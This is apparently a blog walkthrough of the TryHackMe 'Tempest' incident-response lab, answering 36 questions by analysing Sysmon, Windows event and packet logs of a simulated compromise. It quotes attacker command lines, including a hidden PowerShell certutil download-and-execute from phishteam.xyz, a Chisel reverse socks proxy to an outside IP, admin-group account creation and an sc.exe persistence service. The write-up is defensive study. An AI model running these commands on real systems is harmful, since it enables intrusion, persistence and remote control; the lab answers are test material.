   
1. **What is the SHA256 hash of the capture.pcapng file?**  
The question is pretty direct, files are already available, just check for the hash value.  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Ans : CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6  
**2. What is the SHA256 hash of the sysmon.evtx file?**  
Ans : 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F  
**3. What is the SHA256 hash of the windows.evtx file?**  
Ans : D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60  
**4. The user of this machine was compromised by a malicious document. What is the file name of the document?**  
I went through the sysmon logs using the Timeline explorer and got the document name.  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Ans : free_magicules.doc  
**5. What is the name of the compromised user and machine?**  
![](data:image/png;base64,)  
Ans : benimaru-TEMPEST  
**6. What is the PID of the Microsoft Word process that opened the malicious document?**  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Ans : 496  
**7. Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?**  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Ans : 167.71.199.191  
**8. What is the base64 encoded string in the malicious payload executed by the document?**  
This was difficult for me to get. I first tried checking with the file name to find the execution, but that didn’t work. So, I took external help from [here](https://medium.com/@empise/tryhackme-tempest-writeup-02887f79f3cc "https://medium.com/@empise/tryhackme-tempest-writeup-02887f79f3cc"). He has explained it clearly.  
Now, the information we have is the parent process ID, who might have initiated the process. I filtered for the process ID 496, and started searching for the executable info, finally in one of the events, I could find a base 64 encoded messgae, and the application running them was msdt.exe.  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Ans :   
**9. What is the CVE number of the exploit used by the attacker to achieve a remote code execution?**  
Searched in google whar msdt.exe was,a nd that refers to the Microsoft Diagnostic Tool.  
![](data:image/png;base64,)  
Ans : 2022–30190  
**10. The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?**  
Searched for the update.zip file. We know from the base 64 string that they have downloaded the update.zip folder, so searched for that.  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Ans : C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup  
**11. The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?**  
In the description, it was given that explorer.exe is the Autostart, so I checked process with explorer .exe and checked where the execution is occurring.  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Ans : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f ‘[http://phishteam.xyz/02dcf07/first.exe'](http://phishteam.xyz/02dcf07/first.exe' "http://phishteam.xyz/02dcf07/first.exe'") C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe  
**12. Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?**  
Filtered for first.exe file and got the hash value.  
Ans : CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8  
**13. The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?**  
Now, we have understood that there is a first.exe file to perform the execution, so remaing process will be from first. Got the domain name during the filtered log analysis, and port was a confusion. Filtered the logs for dns connection and network connection, and saw that were tcp connections whose port number would be 80.  
Ans : resolvecyber.xyz:80  
**14. What is the URL of the malicious payload embedded in the document?**  
This can be found from the Wireshark logs. They are actually asking for the URL from which the files has been downloaded.  
Ans : [http://phishteam.xyz/02dcf07/index.html](http://phishteam.xyz/02dcf07/index.html "http://phishteam.xyz/02dcf07/index.html")  
**15. What is the encoding used by the attacker on the c2 connection?**  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Here, the payload has been passed is seen in the info column, there you can see the data after the parameter q, which is base 64.  
Ans : base64  
**16. The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?**  
We can see the parameter from the screenshot of the previous question.  
Ans : q  
**17. The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?**  
They are asking for the link, from which the downloads or remaining interactions happens. The information is available in the screenshot from Question 15.  
Ans : /9ab62b5  
**18. What is the HTTP method used by the binary?**  
   
The different HTTP methods are GEt, PUT, POST, DELETE, so they are asking which of them is being used by the binary file.  
Ans : GET  
**19. Based on the user agent, what programming language was used by the attacker to compile the binary?**  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Ans : Nim  
**20. The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?**  
Actually, while doing one of the previous question, I had randomly selected and encoded message and checked the value. There was already a password available and that worked.  
![](data:image/png;base64,)  
Ans : infernotempest  
**21. The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?**  
I was not able to copy the whole set of encoded string into cyberchef to decode, so has to take some external help. While checking through the ports, we can see that port number 5985 is for windows remote management. So, the chance is that the attacker is most likely to take that port.  
Ans : 5985  
**22. The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?**  
We found this a little earlier, but here’s the screenshot again:  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Which was downloaded via:  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Ans :** **C:\Users\benimaru\Downloads\ch.exe client 167[.]71.199.191:8080 R:socks  
**23. What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?**  
Corresponding to the records from the previous question, we can get the SHA of ch.exe.  
Ans : 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451  
**24. What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.**  
I checked the details in VirusTotal and saw some EXE files, and I searched and came across chisel, which is a TCP/UDP tunneling tool.  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Ans : Chisel  
**25. The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?**  
So, we do know that ch.exe had initiated the sock proxy connection. The question is the service that attacker had started after this connection. You will need a lot of patience to do this now. You will have to first find the connection log in the Timeline Explorer, followed by the service that was initiated. Below is the one:  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
This is related to the window remote management system. And from there, you can you the name oof the service.  
Ans : winrm  
**26. After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?**  
As you scroll down after the execution, you can the a file being downloaded from a url using the powershell. There you will have your answer. After that i searched for the file and then extracted the hash data of the file.  
Ans : spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D  
**27. Based on the SHA256 hash of the binary, what is the name of the tool used?**  
Checked in VirusTotal for the tool.  
Press enter or click to view image in full size  
![](data:image/png;base64,)  
Ans : printspoofer  
**28. The tool exploits a specific privilege owned by the user. What is the name of the privilege?**  
This one , I had checked the hint, then googled for the privilege exploted by Print Spoofer.  
Ans : SeImpersonatePrivilege  
**29. Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?**  
During earlier analysis, I had seen that the spf.exe downloads a final.exe file, so the answer was already known. you can check in the logs to confirm.  
Ans : final.exe  
**30. The binary connects to a different port from the first c2 connection. What is the port used?**  
Ans : 8080  
**31. Upon achieving SYSTEM access, the attacker then created two users. What are the account names?**  
This can be obtained from the Brim logs, where you can see the encoded messgaes. They need to be decoded to know the commands that was run by the attacker.  
Ans : shion, shuna  
**32. Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?**  
Ans : /add  
**33. Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?**  
This should be already known by us.  
Ans : 4720  
**34. The attacker added one of the accounts in the local administrator’s group. What is the command used by the attacker?**  
Information is available from the encoded messages.  
Ans : net localgroup administrators /add shion  
**35. Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?**  
Ans : 4732  
**36. After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?**  
Ans : “C:\Windows\system32\sc.exe” \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto  
And done :) It was pretty exhausting to be honest :)
